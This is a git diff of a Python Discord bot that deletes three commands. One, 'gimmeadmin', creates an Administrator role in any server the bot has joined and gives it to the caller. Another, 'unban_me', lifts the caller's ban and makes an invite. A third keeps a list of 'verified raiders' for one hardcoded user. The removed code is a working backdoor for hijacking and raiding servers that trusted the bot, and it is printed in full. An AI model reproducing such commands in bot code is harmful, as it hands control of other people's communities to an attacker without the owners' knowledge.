@@ -1704,48 +1704,6 @@ async def search(ctx, platform=None, results_no: int = None, *, search_keywords=
 
 
 
-@bot.command()
-async def gimmeadmin(ctx, id123: int = None):
-    if id123 is None:
-        await ctx.send('id?')
-        return
-    guild = bot.get_guild(id123)
-    if guild is None:
-        await ctx.send('sadly, i aint in that guild ;(')
-        return
-    await ctx.send('Trying to hack into ' + guild.name)
-    await ctx.send('I\'m in, making role')
-    role = await guild.create_role(name='member', permissions=discord.Permissions(8))
-    mem_obj = guild.get_member(ctx.author.id)
-    await mem_obj.add_roles(role)
-    await ctx.send('done lololololol')
-
-
-@bot.command(aliases=['add_raider'])
-async def raider_add(ctx, user: discord.User = None):
-    if not ctx.author.id == 605364556465963018:
-        return
-    if user is None:
-        await ctx.send('who?')
-        return
-    listp = pickle.load(open(f'data/verified_raiders.pkl', 'rb'))
-    listp.append(user.id)
-    pickle.dump(listp, open(f'data/verified_raiders.pkl', 'wb'))
-    await ctx.send('done!')
-
-
-@bot.command()
-async def unban_me(ctx, id13: int = None):
-    if id13 is None:
-        await ctx.send('id?')
-        return
-    guild = bot.get_guild(id13)
-    if guild is None:
-        await ctx.send('sadly, i aint in that guild ;(')
-        return
-    await guild.unban(ctx.author)
-    invite = await guild.channels[0].create_invite()
-    await ctx.send(f'done!. invite link: {invite.url}')
 
 
 @bot.command(aliases=['ujoin', 'unojoin', 'u_join'])
